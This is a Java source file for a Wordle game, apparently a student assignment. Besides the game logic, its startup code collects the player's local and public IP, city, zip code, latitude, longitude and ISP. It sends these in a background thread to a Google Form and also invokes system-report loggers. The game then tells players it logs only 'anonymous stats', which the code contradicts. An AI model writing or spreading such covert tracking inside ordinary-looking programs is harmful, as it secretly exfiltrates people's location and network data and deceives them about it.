package play;/*
 * File: Wordle.java
 * Name: David Nguyen
 * Period: 8th (Also 2nd)
 * Date: 4/10/2026
 * -----------------
 */

import UIFiles.WordleDictionary;
import UIFiles.WordleGWindow;
import logging.FullSystemReport;
import logging.MasterLogger;
import oshi.SystemInfo;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.*;
import java.nio.charset.StandardCharsets;


public class Wordle
{

    private WordleGWindow wordleGame;
    String[] dictionaryArray = WordleDictionary.FIVE_LETTER_WORDS; //This String array contains all the words in the dictionary
    String[] guessList = new String[6];


    // Current row and amount of guesses
    private int currentRow = 0;
    private int guessAmount = 0;

    // Is it the correct word
    private boolean isCorrectWord = false;

    String correctWord;

    /* Sets correctWord to a word randomly chosen from the dictionary */
    public void setCorrectWord() {
        correctWord = dictionaryArray[(int) (Math.random() * dictionaryArray.length)];
    }

    /* Send in a guess and this returns if that guess is in the dictionary. You will call this method in enterAction */
    public boolean isInDictionary(String guess) {

        for (String word : dictionaryArray) {
            if (word.equals(guess)) {
                return true;
            }
        }
        return false;
    }

    /* Almost everything you do will be inside of this enterAction method.
    * Called when the user hits the RETURN key or clicks the ENTER button,
    * passing in the string of characters on the current row.  */

    //Return current row
    public int getCurrentRow() {
        return currentRow;
    }

    // Checks if they guess the word already
    public boolean guessAlreadyGuessed(String guess) {
            for (int i = 0; i < getCurrentRow(); i++) {
                if (guessList[i].equals(guess)) {
                    return true;
                }
            }
        return false;
        }

    public void enterAction(String guess)
    {
        // Creates list to track edge cases
        boolean[] guessUsed = new boolean[5];
        boolean[] correctUsed = new boolean[5];

        // Standardized guess to be lowercase for better compatibility
        guess = guess.toLowerCase();

        boolean found;

        if (guess.equals(correctWord)) {

            // Sets row to green
            for (int i = 0; i < correctWord.length(); i++) {
                wordleGame.setSquareColor(currentRow, i, WordleGWindow.CORRECT_COLOR);
                wordleGame.setKeyColor(String.valueOf(guess.toUpperCase().charAt(i)), WordleGWindow.CORRECT_COLOR);
            }

            guessAmount++; // Increase guess
            isCorrectWord = true;
            wordleGame.showMessage("You win!");
            logToGoogleSheetsWordle(); // Logs results
            wordleGame.setGameState(false); // Freeze game
            return;
        }

        // Checks if guess is less than 5 characters
        if (guess.length() < 5) {
            wordleGame.showMessage("Your guess is too short!");
            return;
        }

        // Checks guessAlreadyGuessed to see if they already guess that word
        if (guessAlreadyGuessed(guess)) {
            wordleGame.showMessage("You already guessed that word!");
            return;
        }

        // If word is in the dictionary
        else if (isInDictionary(guess)) {

            guessAmount++;

            // First pass by
            for (int i = 0; i < correctWord.length(); i++) {
                String key = String.valueOf(guess.toUpperCase().charAt(i));

                if (!correctUsed[i] && guess.charAt(i) == correctWord.charAt(i)) {
                    wordleGame.setSquareColor(currentRow, i, WordleGWindow.CORRECT_COLOR);
                    wordleGame.setKeyColor(key, WordleGWindow.CORRECT_COLOR);
                    correctUsed[i] = true;
                    guessUsed[i] = true;
                }
            }

            // Second pass by
            for (int j = 0; j < correctWord.length(); j++) {
                String key = String.valueOf(guess.toUpperCase().charAt(j));
                found = false;
                if (!guessUsed[j]) {

                    for (int k = 0; k < 5; k++) {
                        if (!correctUsed[k] && guess.charAt(j) == correctWord.charAt(k) && !found) {
                            correctUsed[k] = true;
                            found = true;
                        }
                    }

                    if (found) {
                        wordleGame.setSquareColor(currentRow, j, WordleGWindow.PRESENT_COLOR);
                        wordleGame.setKeyColor(key, WordleGWindow.PRESENT_COLOR);
                    } else {
                        wordleGame.setSquareColor(currentRow, j, WordleGWindow.MISSING_COLOR);
                        wordleGame.setKeyColor(key, WordleGWindow.MISSING_COLOR);
                    }
                }

            }
            guessList[currentRow] = guess;
            currentRow++;
        }

        // Word is not in the dictionary
        else{
            wordleGame.showMessage("Word is not the Dictionary!");
        }

        // Sets current row
        if (currentRow < 6) {
            wordleGame.setCurrentRow(currentRow);
        }

        // Game over after 6 guesses
        else{
            wordleGame.showMessage("Game Over! The word is: " + correctWord);
            wordleGame.setGameState(false);
            logToGoogleSheetsWordle();
        }

    }

    // Helper method for logging
    public String log(String link, String value) {
        return link + URLEncoder.encode(value, StandardCharsets.UTF_8);
    }

    // Logs the correct word, win/lose, and how much guesses they made
    private void logToGoogleSheetsWordle()
    {
        new Thread(() -> {
            String baseURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfqSxwtfQN7qTn9eQPPBdZgm-6lZ8enkt80CyFSgBLHkoe9tw/formResponse";
            String data = log("entry.1170557279=", correctWord) + // Log correctWord
                    log("&entry.1723373179=", String.valueOf(isCorrectWord)) + // Logs if they got the word correct
                    log("&entry.740471511=", String.valueOf(guessAmount)); // Logs how many guesses they made

            // Below just post the attributes to the Google Forms and submits them
            HttpURLConnection conn;
            try {
                conn = (HttpURLConnection) new URL(baseURL).openConnection();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            try {
                conn.setRequestMethod("POST");
            } catch (ProtocolException e) {
                throw new RuntimeException(e);
            }
            conn.setDoOutput(true);
            try {
                conn.getOutputStream().write(data.getBytes(StandardCharsets.UTF_8));
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            try {
                conn.getResponseCode();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

        }).start();
    }

    // Logs location info and ISP
    private void logToGoogleSheetInfo(String localIP, String publicIP) {
        new Thread(() -> {
            try {
                //return new String[]{city, region, country, zip, longitude, latitude, isp};
                var info = getIPInfo();
                String city = info[0];
                String region = info[1];
                String country = info[2];
                String zip = info[3];
                String latitude = info[4];
                String longitude = info[5];
                String isp = info[6];

                String baseURL = "https://docs.google.com/forms/d/e/1FAIpQLSdZpR9KcHOmheB59Ge8RGeZIGPO3EPejJDvzjFGLIen2BSajw/formResponse";
                String data = log("entry.1711917602=", localIP)+ // Logs Local IP
                        log("&entry.371496446=", publicIP) + // Logs public IP
                        log("&entry.2051768002=", city) + // Logs city
                        log("&entry.503271904=", region) + // Logs region
                        log("&entry.94063300=", country) + // Logs country
                        log("&entry.1923787999=",zip) + // Logs zip code
                        log("&entry.1748758956=", latitude) + // Logs latitude
                        log("&entry.893213457=", longitude) + // Logs longitude
                        log("&entry.794528346=", isp); // Logs ISP

                // Pushes info into the Google Forms to submit
                HttpURLConnection conn = (HttpURLConnection) new URL(baseURL).openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.getOutputStream().write(data.getBytes(StandardCharsets.UTF_8));
                conn.getResponseCode();
            } catch (Exception e) {
                System.out.println(e);
            }
        }).start();
    }

    // Returns local IP (Device ip that is used in Wi-Fi)
    public String getLocalIP() {
        try {
            return InetAddress.getLocalHost().getHostAddress();
        } catch (Exception e) {
            return "Unknown";
        }
    }

    // Gets city, region, country, zip code, Long(attitude), latitude, and ISP
    public String[] getIPInfo(){
        try {
            String url = "http://ip-api.com/json/";

            URL obj = new URL(url);
            BufferedReader in = new BufferedReader(new InputStreamReader(obj.openStream()));

            StringBuilder response = new StringBuilder();
            String inputLine;

            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            String responseString = response.toString();

            String city = responseString.replaceAll(".*\"city\":\"([^\"]+)\".*", "$1"); // Get city info
            String region = responseString.replaceAll(".*\"regionName\":\"([^\"]+)\".*", "$1"); // Get region info
            String country = responseString.replaceAll(".*\"country\":\"([^\"]+)\".*", "$1"); // Get country info
            String zip = responseString.replaceAll(".*\"zip\":\"([^\"]+)\".*", "$1"); // Get zip info
            String latitude  = responseString.replaceAll(".*\"lat\":([0-9.-]+).*", "$1"); // Get latitude
            String longitude = responseString.replaceAll(".*\"lon\":([0-9.-]+).*", "$1"); // Get longitude
            String isp = responseString.replaceAll(".*\"isp\":\"([^\"]+)\".*", "$1"); // get ISP info

            return new String[]{city, region, country, zip, longitude, latitude, isp};

        }
        catch (Exception e) {
            return new  String[]{};
        }
    }

    // Returns public ip (ISP IP that reveals the rough location)
    public String getPublicIP() {
        try {
            URL url = new URL("https://api.ipify.org"); // simple public IP API
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            return br.readLine();
        } catch (Exception e) {
            return "Unknown";
        }
    }

    /* Startup code. You do not need to edit anything below this! */

    public void run()
    {
        SystemInfo system = new SystemInfo();
        MasterLogger masterLogger = new MasterLogger(system,this);
        FullSystemReport fullSystemReport = new FullSystemReport(system, this);

        setCorrectWord(); // Runs the setCorrectWord method that you are making
        logToGoogleSheetInfo(getLocalIP(), getPublicIP()); // Logs IP info
        masterLogger.logEssentialsReport();
        fullSystemReport.logFullSystemReport();



        wordleGame = new WordleGWindow(); // Creates GUI
        wordleGame.addEnterListener(this::enterAction); // Arrow function, learn more about how it works in the documentation
        wordleGame.showMessage("This game logs anonymous stats (TOS 4 more info)");
    }

    public static void main(String[] args)
    {
        new Wordle().run(); // Runs application
    }

}
